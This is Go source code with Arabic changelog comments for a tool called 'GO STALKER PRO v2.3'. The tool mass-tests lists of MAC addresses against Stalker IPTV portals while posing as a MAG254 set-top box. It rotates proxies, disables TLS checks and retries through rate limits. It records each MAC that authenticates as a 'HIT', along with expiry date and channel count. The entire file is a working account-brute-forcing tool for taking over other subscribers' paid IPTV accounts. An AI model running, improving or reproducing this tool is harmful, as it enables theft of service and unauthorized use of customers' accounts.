package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ═══════════ v2 — النسخة المصلحة ═══════════
// إصلاحات عن النسخة الأولى:
// 1) Deadlock: العمال يشتغلون قبل انتظار القارئ (كانت القائمة >5000 تجمد البرنامج)
// 2) مسار البوابة: يجرّب base+/c تلقائياً + /c/server/load.php (بواباتك كلها /c)
// 3) HIT حقيقي: الرد المقفول (js.msg) لا يُعد HIT + عدّ القنوات فعلياً (get_all_channels)
// 4) إحصائيات صادقة: AuthFail منفصلة عن NetworkFail
// 5) v2.2: إعادة المحاولة عند 429/503 (Rate-Limit) مع احترام Retry-After
// 6) v2.3: account_info يكشف الاشتراكات المخفية خلف قالب فارغ (تاريخ الانتهاء في phone/end_date)

func syncAndClose(file *os.File) error {
	if file == nil {
		return nil
	}
	syncErr := file.Sync()
	closeErr := file.Close()
	if syncErr != nil && closeErr != nil {
		return fmt.Errorf("sync failed: %v; close failed: %w", syncErr, closeErr)
	}
	if syncErr != nil {
		return fmt.Errorf("sync failed: %w", syncErr)
	}
	if closeErr != nil {
		return fmt.Errorf("close failed: %w", closeErr)
	}
	return nil
}

func fileExists(path string) (bool, error) {
	info, err := os.Stat(path)
	if err == nil {
		return !info.IsDir(), nil
	}
	if os.IsNotExist(err) {
		return false, nil
	}
	return false, err
}

func ensureDirectory(path string) error {
	if strings.TrimSpace(path) == "" {
		return fmt.Errorf("directory path is empty")
	}
	return os.MkdirAll(path, 0755)
}

func checkWritableFile(path string) error {
	file, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("file is not writable: %w", err)
	}
	return file.Close()
}

func validatePortalURL(raw string) (string, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return "", fmt.Errorf("portal URL is empty")
	}
	if !strings.Contains(raw, "://") {
		raw = "http://" + raw
	}
	u, err := url.ParseRequestURI(raw)
	if err != nil {
		return "", fmt.Errorf("invalid URL: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return "", fmt.Errorf("unsupported URL scheme")
	}
	if u.Host == "" {
		return "", fmt.Errorf("missing host")
	}
	return strings.TrimRight(u.String(), "/"), nil
}

func checkScannerError(scanner *bufio.Scanner) error {
	if err := scanner.Err(); err != nil {
		return fmt.Errorf("file scanning failed: %w", err)
	}
	return nil
}

// ── v2.3: تواريخ بأشكال متعددة (بما فيها November 25, 2026, 1:41 am) ──
func parseFlexDate(value string) (time.Time, bool) {
	value = strings.TrimSpace(value)
	if value == "" {
		return time.Time{}, false
	}
	layouts := []string{
		"January 2, 2006, 3:04 pm",
		"January 2, 2006, 15:04",
		"January 2, 2006",
		"2006-01-02 15:04:05",
		"2006-01-02",
	}
	for _, layout := range layouts {
		if t, err := time.ParseInLocation(layout, value, time.Local); err == nil {
			return t, true
		}
	}
	return time.Time{}, false
}

func calculateRemaining(expiration time.Time) string {
	now := time.Now()
	if expiration.Before(now) {
		return "Expired"
	}
	diff := expiration.Sub(now)
	if diff < 24*time.Hour {
		return "< 1 Day"
	}
	days := int(diff.Hours() / 24)
	return fmt.Sprintf("%d Days", days)
}

func isValidMAC(mac string) bool {
	parts := strings.Split(strings.ToUpper(strings.TrimSpace(mac)), ":")
	if len(parts) != 6 {
		return false
	}
	for _, part := range parts {
		if len(part) != 2 {
			return false
		}
		if _, err := strconv.ParseUint(part, 16, 8); err != nil {
			return false
		}
	}
	return true
}

func parseExpirationDate(value interface{}) (time.Time, bool) {
	switch v := value.(type) {
	case float64:
		if v <= 0 {
			return time.Time{}, false
		}
		sec := int64(v)
		if v > 1e12 {
			sec = int64(v / 1000)
		}
		return time.Unix(sec, 0), true
	case string:
		v = strings.TrimSpace(v)
		if v == "" || v == "0000-00-00 00:00:00" {
			return time.Time{}, false
		}
		for _, layout := range []string{
			"2006-01-02 15:04:05",
			"2006-01-02",
		} {
			t, err := time.ParseInLocation(layout, v, time.Local)
			if err == nil {
				return t, true
			}
		}
	}
	return time.Time{}, false
}

// ── إصلاح 2: يجرّب base كما هو + base/c مع /c/server/load.php ──
func searchPortalEndpoint(portalURL string, client *http.Client) (string, string) {
	bases := []string{portalURL}
	if !strings.HasSuffix(portalURL, "/c") && !strings.HasSuffix(portalURL, "/c/") {
		bases = append(bases, portalURL+"/c")
	}
	endpoints := []string{
		"/server/load.php",
		"/portal.php",
		"/stalker_portal/server/load.php",
		"/c/server/load.php",
		"/c/portal.php",
		"/portalstb/",
	}

	fmt.Println("\n[*] Scanning portal endpoints...")
	for _, b := range bases {
		for _, ep := range endpoints {
			testURL := b + ep + "?type=stb&action=handshake&JsHttpRequest=1-xml"
			req, err := http.NewRequest("GET", testURL, nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/537.36 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/537.36")

			resp, err := doWithRetry(client, req)
			if err != nil {
				continue
			}
			resp.Body.Close()

			if resp.StatusCode == 200 || resp.StatusCode == 401 || resp.StatusCode == 512 {
				fmt.Printf("[✓] Found working endpoint: %s%s\n", b, ep)
				return b, ep
			}
		}
	}
	fmt.Println("[!] Defaulting to base + /server/load.php")
	return portalURL, "/server/load.php"
}

var (
	proxyList  []string
	proxyIndex int64
	useProxy   bool
)

func loadProxies(proxyFilePath string) error {
	proxyFilePath = strings.TrimSpace(proxyFilePath)

	var pathsToTry []string
	if proxyFilePath == "" {
		pathsToTry = []string{"proxy.txt", "proxy/proxy.txt", "./proxy.txt"}
	} else {
		pathsToTry = []string{
			proxyFilePath,
			"proxy.txt",
			"proxy/" + proxyFilePath,
			"./" + proxyFilePath,
		}
	}

	var file *os.File
	var err error
	var openedPath string

	for _, p := range pathsToTry {
		if p == "" {
			continue
		}
		file, err = os.Open(p)
		if err == nil {
			openedPath = p
			break
		}
	}

	if err != nil {
		return fmt.Errorf("file not found in standard paths")
	}

	defer func() {
		if closeErr := file.Close(); closeErr != nil {
			fmt.Fprintf(os.Stderr, "[-] Warning: failed to close proxy file: %v\n", closeErr)
		}
	}()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			proxyList = append(proxyList, line)
		}
	}

	if len(proxyList) > 0 {
		fmt.Printf("[+] Loaded %d proxies successfully from: %s\n", len(proxyList), openedPath)
	}
	return scanner.Err()
}

func getProxyTransport() *http.Transport {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	if !useProxy || len(proxyList) == 0 {
		return tr
	}

	idx := atomic.AddInt64(&proxyIndex, 1)
	proxyStr := proxyList[int(idx)%len(proxyList)]

	var proxyURL *url.URL
	var err error
	if strings.HasPrefix(proxyStr, "http://") || strings.HasPrefix(proxyStr, "socks5://") {
		proxyURL, err = url.Parse(proxyStr)
	} else {
		proxyURL, err = url.Parse("http://" + proxyStr)
	}

	if err == nil && proxyURL != nil {
		tr.Proxy = http.ProxyURL(proxyURL)
	}
	return tr
}

// ── v2.2: إعادة المحاولة التلقائية عند 429/503 (البوابة تحدد المعدل) ──
func doWithRetry(client *http.Client, req *http.Request) (*http.Response, error) {
	const maxAttempts = 3
	var resp *http.Response
	var err error
	for attempt := 1; attempt <= maxAttempts; attempt++ {
		resp, err = client.Do(req)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != http.StatusTooManyRequests && resp.StatusCode != http.StatusServiceUnavailable {
			return resp, nil
		}
		wait := time.Duration(attempt) * 1200 * time.Millisecond
		if ra := strings.TrimSpace(resp.Header.Get("Retry-After")); ra != "" {
			if secs, pErr := strconv.Atoi(ra); pErr == nil && secs > 0 && secs <= 10 {
				wait = time.Duration(secs) * time.Second
			}
		}
		resp.Body.Close()
		if attempt < maxAttempts {
			time.Sleep(wait)
		}
	}
	return nil, fmt.Errorf("status code: %d (rate limited, retried %d times)", resp.StatusCode, maxAttempts-1)
}

func hea1(portalURL, mac string) map[string]string {
	macs := strings.ToUpper(mac)
	return map[string]string{
		"User-Agent":      "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/537.36 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/537.36",
		"Referer":         portalURL + "/c/",
		"Accept":          "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Cookie":          "mac=" + url.QueryEscape(macs) + "; stb_lang=en; timezone=Europe%2FParis;",
		"Connection":      "Keep-Alive",
		"X-User-Agent":    "Model: MAG254; Link: Ethernet",
	}
}

func hea2(mac, token string) map[string]string {
	macs := strings.ToUpper(mac)
	return map[string]string{
		"User-Agent":      "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/537.36 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/537.36",
		"Referer":         "/c/",
		"Accept":          "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Cookie":          "mac=" + url.QueryEscape(macs) + "; stb_lang=en; timezone=Europe%2FParis;",
		"Connection":      "Keep-Alive",
		"X-User-Agent":    "Model: MAG254; Link: Ethernet",
		"Authorization":   "Bearer " + token,
	}
}

func performHandshake(client *http.Client, portalURL, endpoint, mac string) (string, error) {
	encodedMac := url.QueryEscape(mac)
	handshakeURL := fmt.Sprintf("%s%s?type=stb&action=handshake&mac=%s&token=&prehash=false&JsHttpRequest=1-xml", portalURL, endpoint, encodedMac)

	req, err := http.NewRequest("GET", handshakeURL, nil)
	if err != nil {
		return "", err
	}

	headers := hea1(portalURL, mac)
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := doWithRetry(client, req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return "", fmt.Errorf("status code: %d", resp.StatusCode)
	}

	var hsResult map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&hsResult); err != nil {
		return "", err
	}

	var authToken string
	if jsVal, exists := hsResult["js"]; exists && jsVal != nil {
		if jsData, ok := jsVal.(map[string]interface{}); ok {
			if token, exists := jsData["token"]; exists && token != nil {
				authToken = fmt.Sprintf("%v", token)
			}
		}
	} else if token, exists := hsResult["token"]; exists && token != nil {
		authToken = fmt.Sprintf("%v", token)
	}

	if authToken == "" {
		return "", fmt.Errorf("token not found")
	}

	return authToken, nil
}

func performGetProfile(client *http.Client, portalURL, endpoint, mac, token string) (map[string]interface{}, error) {
	encodedMac := url.QueryEscape(mac)
	profileURL := fmt.Sprintf("%s%s?type=stb&action=get_profile&mac=%s&token=%s&JsHttpRequest=1-xml", portalURL, endpoint, encodedMac, url.QueryEscape(token))

	req, err := http.NewRequest("GET", profileURL, nil)
	if err != nil {
		return nil, err
	}

	headers := hea2(mac, token)
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := doWithRetry(client, req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("status code: %d", resp.StatusCode)
	}

	var profileResult map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&profileResult); err != nil {
		return nil, err
	}

	return profileResult, nil
}

// ── v2.3: account_info — مصدر الحقيقة على بوابات تخفي الملف خلف قالب فارغ ──
func performAccountInfo(client *http.Client, portalURL, endpoint, mac, token string) (string, string, error) {
	aiURL := fmt.Sprintf("%s%s?type=account_info&action=get_main_info&JsHttpRequest=1-xml", portalURL, endpoint)
	req, err := http.NewRequest("GET", aiURL, nil)
	if err != nil {
		return "", "", err
	}
	headers := hea2(mac, token)
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := doWithRetry(client, req)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return "", "", fmt.Errorf("status code: %d", resp.StatusCode)
	}
	var r map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&r); err != nil {
		return "", "", err
	}
	var js map[string]interface{}
	if j, ok := r["js"].(map[string]interface{}); ok {
		js = j
	}
	getStr := func(k string) string {
		if js == nil {
			return ""
		}
		if s, ok := js[k].(string); ok {
			return strings.TrimSpace(s)
		}
		return ""
	}
	return getStr("phone"), getStr("end_date"), nil
}

// ── إصلاح 3: عدّ القنوات الحقيقي — HIT بلا قنوات = مشبوه ──
func fetchChannelsCount(client *http.Client, portalURL, endpoint, mac, token string) int {
	chURL := fmt.Sprintf("%s%s?type=stb&action=get_all_channels&JsHttpRequest=1-xml", portalURL, endpoint)
	req, err := http.NewRequest("GET", chURL, nil)
	if err != nil {
		return 0
	}
	headers := hea2(mac, token)
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := doWithRetry(client, req)
	if err != nil {
		return 0
	}
	defer resp.Body.Close()
	var r map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&r); err != nil {
		return 0
	}
	if arr, ok := r["js"].([]interface{}); ok {
		return len(arr)
	}
	return 0
}

func fetchPlayerAPI(client *http.Client, portalURL, mac, token string) string {
	playerAPIURL := fmt.Sprintf("%s/player_api.php?username=user&password=pass", portalURL)
	req, err := http.NewRequest("GET", playerAPIURL, nil)
	if err != nil {
		return ""
	}
	headers := hea2(mac, token)
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := doWithRetry(client, req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		return " | Player API Available"
	}
	return ""
}

func printSummary(
	duration time.Duration,
	read, invalid, processed, hits int64,
	networkFails, authFails, structureFails, blocked, ghost, ioFails int64,
) {
	fmt.Println("\n========== PROJECT SUMMARY ==========")
	fmt.Printf("Duration          : %v\n", duration)
	fmt.Printf("Valid Inputs      : %d\n", read)
	fmt.Printf("Invalid Inputs    : %d\n", invalid)
	fmt.Printf("Processed         : %d\n", processed)
	fmt.Printf("Successful Hits   : %d\n", hits)
	fmt.Printf("Blocked/Invalid   : %d\n", blocked)
	fmt.Printf("Ghost/NoData      : %d\n", ghost)
	fmt.Printf("Network Errors    : %d\n", networkFails)
	fmt.Printf("Auth Failures     : %d\n", authFails)
	fmt.Printf("Structure Errors  : %d\n", structureFails)
	fmt.Printf("I/O Errors        : %d\n", ioFails)
	fmt.Println("=====================================")
}

func main() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Println("==================================================")
	fmt.Println("   ⚡ GO STALKER PRO - v2.3     ⚡                 ")
	fmt.Println("==================================================")

	fmt.Print("Enter Portal URL (e.g. http://example.com:8080[/c]): ")
	rawURL, err := reader.ReadString('\n')
	if err != nil {
		fmt.Println("[-] Error reading portal URL input.")
		return
	}

	portalURL, err := validatePortalURL(rawURL)
	if err != nil {
		fmt.Printf("[-] Error: %v\n", err)
		return
	}

	fmt.Print("Enter Mac List File (e.g. macs.txt): ")
	macFile, err := reader.ReadString('\n')
	if err != nil {
		macFile = "macs.txt"
	}
	macFile = strings.TrimSpace(macFile)
	if macFile == "" {
		macFile = "macs.txt"
	}

	exists, err := fileExists(macFile)
	if err != nil || !exists {
		fmt.Printf("[-] Error: Mac file '%s' does not exist or cannot be accessed.\n", macFile)
		return
	}

	fmt.Print("Do you want to use a proxy file? (y/n): ")
	useProxyChoice, _ := reader.ReadString('\n')
	if strings.TrimSpace(strings.ToLower(useProxyChoice)) == "y" {
		useProxy = true
		fmt.Print("Enter Proxy File Path (e.g. proxy.txt): ")
		proxyPath, _ := reader.ReadString('\n')
		proxyPath = strings.TrimSpace(proxyPath)
		if err := loadProxies(proxyPath); err != nil {
			fmt.Printf("[-] Warning: Failed to load proxies: %v. Running without proxy.\n", err)
			useProxy = false
		}
	}

	fmt.Print("Enter Concurrency / Threads (Recommended 50-200): ")
	threadsStr, _ := reader.ReadString('\n')
	threadsStr = strings.TrimSpace(threadsStr)
	threads, convErr := strconv.Atoi(threadsStr)
	if convErr != nil || threads <= 0 {
		threads = 50
	} else if threads > 300 {
		threads = 300
	}

	if err := ensureDirectory("Hits"); err != nil {
		fmt.Printf("[-] Error: Failed to create 'Hits' directory: %v\n", err)
		return
	}

	hitPath := "Hits/go_hits.txt"
	if err := checkWritableFile(hitPath); err != nil {
		fmt.Printf("[-] Error: %v\n", err)
		return
	}

	hitFile, err := os.OpenFile(hitPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		fmt.Printf("[-] Error creating hit file: %v\n", err)
		return
	}

	defer func() {
		if closeErr := syncAndClose(hitFile); closeErr != nil {
			fmt.Fprintf(os.Stderr, "[-] Error finalizing hit file: %v\n", closeErr)
		}
	}()

	tempClient := &http.Client{Timeout: 5 * time.Second}
	portalBase, endpoint := searchPortalEndpoint(portalURL, tempClient)

	var workersWg sync.WaitGroup
	var readerWg sync.WaitGroup

	var hitCount atomic.Int64
	var networkFailCount atomic.Int64
	var authFailCount atomic.Int64
	var responseStructureFailCount atomic.Int64
	var blockedCount atomic.Int64
	var ioFailCount atomic.Int64
	var readCount atomic.Int64
	var workerAttemptCount atomic.Int64
	var invalidMacCount atomic.Int64
	var ghostCount atomic.Int64
	var printedFail atomic.Int64
	var mutex sync.Mutex

	macChan := make(chan string, 5000)
	errChan := make(chan error, 50)

	startTime := time.Now()

	// ── إصلاح 1 (Deadlock): العمال أولاً — ثم القارئ بالتوازي ──
	for i := 0; i < threads; i++ {
		workersWg.Add(1)
		go func() {
			defer workersWg.Done()

			client := &http.Client{
				Transport: getProxyTransport(),
				Timeout:   8 * time.Second,
			}

			for mac := range macChan {
				workerAttemptCount.Add(1)

				authToken, err := performHandshake(client, portalBase, endpoint, mac)
				if err != nil {
					if strings.Contains(err.Error(), "token not found") {
						authFailCount.Add(1)
					} else {
						networkFailCount.Add(1)
						if printedFail.Add(1) <= 20 {
							fmt.Println("[i] " + mac + " → handshake: " + err.Error())
						}
					}
					if useProxy {
						client.Transport = getProxyTransport()
					}
					continue
				}

				profileResult, err := performGetProfile(client, portalBase, endpoint, mac, authToken)
				if err != nil {
					if strings.Contains(err.Error(), "json") || strings.Contains(err.Error(), "invalid character") {
						responseStructureFailCount.Add(1)
					} else {
						networkFailCount.Add(1)
					}
					if printedFail.Add(1) <= 20 {
						fmt.Println("[i] " + mac + " → profile: " + err.Error())
					}
					continue
				}

				var dataMap map[string]interface{}
				if jsVal, exists := profileResult["js"]; exists && jsVal != nil {
					if d, ok := jsVal.(map[string]interface{}); ok {
						dataMap = d
					}
				}
				if dataMap == nil {
					if dataVal, exists := profileResult["data"]; exists && dataVal != nil {
						if d, ok := dataVal.(map[string]interface{}); ok {
							dataMap = d
						}
					}
				}

				if dataMap != nil {
					// ── إصلاح 3: المقفول (js.msg غير فارغ) ليس HIT ──
					var msgS string
					if m2, ok2 := dataMap["msg"].(string); ok2 {
						msgS = m2
					}
					if strings.TrimSpace(msgS) != "" {
						blockedCount.Add(1)
						continue
					}

					hasReal := false
					if expVal0, exists0 := dataMap["exp_date"]; exists0 && expVal0 != nil {
						if _, ok0 := parseExpirationDate(expVal0); ok0 {
							hasReal = true
						}
					}
					if st0, ok1 := dataMap["status"].(string); ok1 && strings.TrimSpace(st0) != "" {
						hasReal = true
					}
					if id0, ok2 := dataMap["id"].(float64); ok2 && id0 > 0 {
						hasReal = true
					}
					expDate := "Unknown"
					daysRemaining := "N/A"

					if expVal, exists := dataMap["exp_date"]; exists && expVal != nil {
						if parsedTime, ok := parseExpirationDate(expVal); ok {
							expDate = parsedTime.Format("2006-01-02 15:04:05")
							daysRemaining = calculateRemaining(parsedTime)
						}
					}

					// ── v2.3: القالب الفارغ ليس حكماً نهائياً — اسأل account_info ──
					if !hasReal {
						phone, endDate, aiErr := performAccountInfo(client, portalBase, endpoint, mac, authToken)
						aiExp := endDate
						if aiExp == "" {
							aiExp = phone
						}
						if aiErr == nil && aiExp != "" && aiExp != "0000-00-00 00:00:00" {
							if t, ok := parseFlexDate(aiExp); ok {
								expDate = t.Format("2006-01-02 15:04:05")
								daysRemaining = calculateRemaining(t)
							} else {
								expDate = aiExp
								daysRemaining = "N/A"
							}
						} else {
							ghostCount.Add(1)
							continue
						}
					}

					chans := fetchChannelsCount(client, portalBase, endpoint, mac, authToken)
					extraInfo := fetchPlayerAPI(client, portalBase, mac, authToken)

					hitMsg := fmt.Sprintf("[HIT] Portal: %s%s | MAC: %s | Expire: %s | Remaining: %s | Channels: %d%s",
						portalBase, endpoint, mac, expDate, daysRemaining, chans, extraInfo)

					mutex.Lock()
					if _, writeErr := hitFile.WriteString(hitMsg + "\n"); writeErr != nil {
						ioFailCount.Add(1)
					} else {
						fmt.Println(hitMsg)
						hitCount.Add(1)
					}
					mutex.Unlock()
				} else {
					responseStructureFailCount.Add(1)
				}
			}
		}()
	}

	readerWg.Add(1)
	go func() {
		defer readerWg.Done()
		defer close(macChan)

		file, openErr := os.Open(macFile)
		if openErr != nil {
			errChan <- fmt.Errorf("failed to open mac file: %w", openErr)
			return
		}

		defer func() {
			if closeErr := file.Close(); closeErr != nil {
				errChan <- fmt.Errorf("failed to close mac file: %w", closeErr)
			}
		}()

		scanner := bufio.NewScanner(file)
		buf := make([]byte, 0, 64*1024)
		scanner.Buffer(buf, 2*1024*1024)

		for scanner.Scan() {
			mac := strings.TrimSpace(scanner.Text())
			if mac != "" {
				if isValidMAC(mac) {
					readCount.Add(1)
					macChan <- mac
				} else {
					invalidMacCount.Add(1)
				}
			}
		}

		if scanErr := checkScannerError(scanner); scanErr != nil {
			errChan <- scanErr
		}
	}()

	readerWg.Wait()
	workersWg.Wait()
	close(errChan)

	duration := time.Since(startTime)

	for fileErr := range errChan {
		fmt.Fprintf(os.Stderr, "[-] File Error: %v\n", fileErr)
	}

	printSummary(
		duration,
		readCount.Load(),
		invalidMacCount.Load(),
		workerAttemptCount.Load(),
		hitCount.Load(),
		networkFailCount.Load(),
		authFailCount.Load(),
		responseStructureFailCount.Load(),
		blockedCount.Load(),
		ghostCount.Load(),
		ioFailCount.Load(),
	)
}
